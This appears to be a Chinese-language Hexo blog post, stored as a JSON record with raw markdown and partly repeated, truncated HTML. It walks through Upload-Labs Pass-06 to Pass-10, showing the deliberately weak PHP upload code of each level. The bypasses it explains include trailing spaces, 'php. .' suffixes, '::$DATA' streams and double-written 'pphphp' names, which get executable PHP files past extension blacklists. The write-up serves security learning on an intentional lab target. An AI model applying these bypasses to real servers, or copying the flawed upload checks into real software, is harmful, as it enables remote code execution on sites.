    $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path =  UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t这道题和前面不同的是`$file_name = str_ireplace($deny_ext,\"\", $file_name)`，对于这个函数：`str_ireplace(find,replace,string,count)`，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名`2333.pphphp`，只有一个\"php\"字符串被匹配到并被替换成空串，剩下的文件名就成了`2333.php`。\n\n![](https://s1.ax1x.com/2020/11/09/Bb8yPf.png)\n\n上传并访问文件。完工","source":"_posts/Upload-Labs2.md","raw":"---\ntitle: Upload-Labs(二)\ndate: 2020-11-09 20:12:27\ntags:  \n- 文件上传漏洞\ncategories:\n- DROPS\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111104025.jpg\n---\n\n## 前言\n\n​\t这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n    //这里下面是过滤\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".html\", ......);\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n\t//这里下面是移动文件。\n    \tif (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n   \n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n\n\n过滤部分：\n\n* `$deny_ext`是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。\n\n * `$file_name = trim($FILES['upload_file']['name'])`这段代码有两个点需要说：\n   1. `$FILES['upload_file']['name']`是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：[PHP $_FILES函数详解](https://www.cnblogs.com/laijinquan/p/8682282.html)。\n   2. `trim()`函数的作用就是去除文件名称前后的空格换行符等。\n* `$file_name = deldot($file_name)`这个注释中很清楚，是删除文章末尾的点。\n* `$file_ext = strrchr($file_name, '.')`中`strrchr(string s1,char c1)`函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。\n* `$file_ext = strtolower($file_ext)`注释上转换小写。\n* `$file_ext = str_ireplace('::$DATA', '', $file_ext)`去除字符串::$DATA。第八题讲了原理\n\n上传部分：\n\n* `in_array($file_ext, $deny_ext)`判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。\n* `$_FILES['upload_file']['tmp_name']`文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。\n*  `$img_path = UPLOAD_PATH.'/'.$file_name`这个变量是设置需要保存到的路径\n* `move_uploaded_file($temp_file, $img_path)`本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。\n\n\n\n## Pass-06\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t看源码发现少了`trim()`函数**对文件名前后的空格处理**，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php  (有空格)绕过黑名单数组。\n\n![](https://s1.ax1x.com/2020/11/09/Bb9jQe.png)\n\n​\t上传以后访问文件执行成功。完工\n\n![](https://s1.ax1x.com/2020/11/09/Bb9xLd.png)\n\n​\t这里说明一下，我前面是在[BUUCTF](https://buuoj.cn/)在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06-->github下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。\n\n​\t\n\n## Pass-07\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t这道题少了**删除文件名末尾的点**，我们可以通过构造**2333.php. .**(末尾加 点 空格 点)，被解析后文件后缀就会成为\". \"(一个点一个空格)，可以绕过黑名单，访问的文件名是`2333.php. .`\n\n![](https://s1.ax1x.com/2020/11/09/BbCOkq.png)\n\n​\t我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个\".\"，尝试在windows靶机上测试**只添加一个点**，访问的文件名为`2333.php、2333.php.`都可以，因为windows会删除最后一个点。\n\n![](https://s1.ax1x.com/2020/11/09/BbMywV.png)\n\n![](https://s1.ax1x.com/2020/11/09/BbKXq0.png)\n\n​\t两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工\n\n\n\n## Pass-08\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t审查代码发现少了对`::$DATA`字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理：\n\n> php在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名\n\n​\t直接上传的时候抓包在文件名后面添加`::$DATA`。\n\n![](https://s1.ax1x.com/2020/11/09/BbP84P.png)\n\n​\t上传访问。完工\n\n\n\n## Pass-09\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过`strrchr()`函数截取后缀名转换小写。\n\n​\t所以和第七题一样构造**2333.php. .**(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点\".\"，铁定不在黑名单后缀里，实现绕过后缀检查。\n\n​\t但是这道题**只能使用windows环境**，因为执行了`deldot()`函数删除了最后一个点之后，文件名成了`2333.php.`，而linux环境下因为不会自动删除最后一个点而不能访问成功。\n\n​\t图前面有了就不贴了。\n\n\n\n## Pass-10\n\n源码：\n\n```\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path =  UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t这道题和前面不同的是`$file_name = str_ireplace($deny_ext,\"\", $file_name)`，对于这个函数：`str_ireplace(find,replace,string,count)`，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名`2333.pphphp`，只有一个\"php\"字符串被匹配到并被替换成空串，剩下的文件名就成了`2333.php`。\n\n![](https://s1.ax1x.com/2020/11/09/Bb8yPf.png)\n\n上传并访问文件。完工","slug":"Upload-Labs2","published":1,"updated":"2021-12-30T09:42:54.196Z","_id":"ckrr3f9au000khotc9ymrezc8","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">    //这里下面是过滤</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.html&quot;, ......);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\"></span><br><span class=\"line\">\t//这里下面是移动文件。</span><br><span class=\"line\">    \tif (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>过滤部分：</p>\n<ul>\n<li><p><code>$deny_ext</code>是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。</p>\n</li>\n<li><p><code>$file_name = trim($FILES[&#39;upload_file&#39;][&#39;name&#39;])</code>这段代码有两个点需要说：</p>\n<ol>\n<li><code>$FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：<a href=\"https://www.cnblogs.com/laijinquan/p/8682282.html\">PHP $_FILES函数详解</a>。</li>\n<li><code>trim()</code>函数的作用就是去除文件名称前后的空格换行符等。</li>\n</ol>\n</li>\n<li><p><code>$file_name = deldot($file_name)</code>这个注释中很清楚，是删除文章末尾的点。</p>\n</li>\n<li><p><code>$file_ext = strrchr($file_name, &#39;.&#39;)</code>中<code>strrchr(string s1,char c1)</code>函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。</p>\n</li>\n<li><p><code>$file_ext = strtolower($file_ext)</code>注释上转换小写。</p>\n</li>\n<li><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>去除字符串::$DATA。第八题讲了原理</p>\n</li>\n</ul>\n<p>上传部分：</p>\n<ul>\n<li><code>in_array($file_ext, $deny_ext)</code>判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。</li>\n<li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。</li>\n<li> <code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name</code>这个变量是设置需要保存到的路径</li>\n<li><code>move_uploaded_file($temp_file, $img_path)</code>本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。</li>\n</ul>\n<h2 id=\"Pass-06\"><a href=\"#Pass-06\" class=\"headerlink\" title=\"Pass-06\"></a>Pass-06</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class=\"line\">        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class=\"line\">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件不允许上传&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    看源码发现少了<code>trim()</code>函数<strong>对文件名前后的空格处理</strong>，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php  (有空格)绕过黑名单数组。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/Bb9jQe.png\"></p>\n<p>​    上传以后访问文件执行成功。完工</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/Bb9xLd.png\"></p>\n<p>​    这里说明一下，我前面是在<a href=\"https://buuoj.cn/\">BUUCTF</a>在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06–&gt;github下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。</p>\n<p>​    </p>\n<h2 id=\"Pass-07\"><a href=\"#Pass-07\" class=\"headerlink\" title=\"Pass-07\"></a>Pass-07</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$is_upload = false;</span><br><span class=\"line\">$msg = null;</span><br><span class=\"line\">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class=\"line\">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class=\"line\">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class=\"line\">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class=\"line\">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class=\"line\">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class=\"line\">        $file_ext = trim($file_ext); //首尾去空</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class=\"line\">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class=\"line\">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class=\"line\">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class=\"line\">                $is_upload = true;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $msg = &#x27;上传出错！&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这道题少了<strong>删除文件名末尾的点</strong>，我们可以通过构造<strong>2333.php. .</strong>(末尾加 点 空格 点)，被解析后文件后缀就会成为”. “(一个点一个空格)，可以绕过黑名单，访问的文件名是<code>2333.php. .</code></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbCOkq.png\"></p>\n<p>​    我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个”.”，尝试在windows靶机上测试<strong>只添加一个点</strong>，访问的文件名为<code>2333.php、2333.php.</code>都可以，因为windows会删除最后一个点。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbMywV.png\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/09/BbKXq0.png\"></p>\n<p>​    